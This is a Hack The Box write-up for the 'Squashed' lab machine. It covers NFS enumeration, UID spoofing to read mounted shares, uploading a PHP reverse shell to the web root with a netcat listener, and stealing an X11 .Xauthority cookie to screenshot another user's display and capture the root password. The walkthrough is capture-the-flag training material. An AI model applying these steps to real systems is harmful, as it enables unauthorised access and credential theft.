---
layout: post
title: HTB Machine - Squashed
subtitle: Writeup
cover-img: 
thumbnail-img: 
share-img: 
tags: [ HTB, Hack the Box,Network,Vulnerability Assessment,Common Services,Authentication,Arbitrary File Upload]
---
scans:
```zsh
sudo nmap -sS 10.10.11.191 -p- --open --min-rate 5000 -n -Pn -oG ./nmap/allports
sudo nmap -sCV 10.10.11.191 -p22,80,111,36455,37653,43573,55477 -oN ./nmap/targeted
 
  whatweb http://10.10.11.191
http://10.10.11.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.191], JQuery[3.0.0], Script, Title[Built Better], X-UA-Compatible[IE=edge]
```

There are a few interesting ports. The webpage seems to be static, fuzzing it seems to produce nothing interesting. There is also a NFS server/client running so we can enumerate it. 
```zsh
showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```
We can try and mount the filesystem after creating particular folders for each. 
```zsh
sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/1 
sudo mount -t nfs 10.10.11.191:/home/ross /mnt/2
```
After mounting the folders we see we cannot read the information inside the folder, perhaps because it is not destined to our user.
```zsh
ls -la
```

To bypass this we could create a user with the particular UID and confirm we have the right setting by checking the /etc/passwd.
```zsh
sudo useradd patata
sudo usermod -u 2017 patata
cat /etc/passwd
```
Now we can use that user to poke around. On the www/html folder we can see that it might be the live website folder. We can test that theory by uploading a regular text file and then calling it through the browser. 

This works, so we can go ahead and upload a reverse shell written in php. I have one already created but for alternatives look for revshells.com
After uploading the reverse shell, set up a netcat listener and call our revshell.php by using curl. 

```zsh
nc -lvnp 4444
curl http://10.10.11.191/reverse.php
```
We are in as a user called Alex and inside his home folder resides the first flag. 

After several checks I did not find anything useful to scalate privileges. So I went back to enumerating the other folder /ross. The folder cannot be access through our user, once again the user UID is not the one required to access the folder content. So we just change the user ID for our previous user (or create a new user with the needed UID).

```zsh
sudo usermod -u 1001 patata
```
Checking the shared folder from the user ross we see the .xauthority file. Doing a bit of research we found out it could be paired with the xwd command to get an screenshot of the currently log in user. We can check if there is another user log-in by going our alex terminal and input 'w'.
Great so we need the xauthority cookie in the alex folder and with it send a command to get a screenshot from the display of user ross. Since we are in the shared folder with enough permissions to it, lets create a python web server and then from the alex console/folder lets download the cookie with wget. 
```zsh
python3 -m http.server 80880
wget 10.10.14.10:8080/.xauthority
```
Now that we have the cookie we need to set it as environment variable to be used with the xwd command. 

```zsh
export XAUTHORITY=/tmp/.Xauthority
```
now that we have the cookie all set we can issue the command and get a screenshot from the ross user. 
```zsh
xwd -display :0 -root -out screenshot.xwd
```
now we just need to convert the screenshot to an image type file. 
```
convert screenshot.xwd screen.png
```
the image shows the password for the root user that we can use after issuing the command su. With that we have gained full privilege access to the machine and can get the final flag. 
